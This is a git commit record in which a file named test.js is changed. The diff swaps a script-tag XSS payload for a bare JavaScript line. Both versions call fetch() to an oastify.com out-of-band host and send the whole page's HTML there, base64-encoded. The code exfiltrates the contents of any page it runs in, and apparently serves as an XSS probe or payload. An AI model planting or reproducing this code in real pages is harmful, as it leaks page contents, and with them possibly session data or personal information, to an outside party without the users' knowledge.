8fe694251bd370a696d7e11d086adb2d117751f7
Victor Bravo <63818704+chinonin0@users.noreply.github.com>
2025-10-03 19:40:30 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-<script>fetch("https://0stjz8e8p6ide1vtjrzm3ah6bxho5mtb.oastify.com/dom?html=" + btoa(document.documentElement.innerHTML))</script>
+fetch("https://0stjz8e8p6ide1vtjrzm3ah6bxho5mtb.oastify.com/dom?html=" + btoa(document.documentElement.innerHTML));
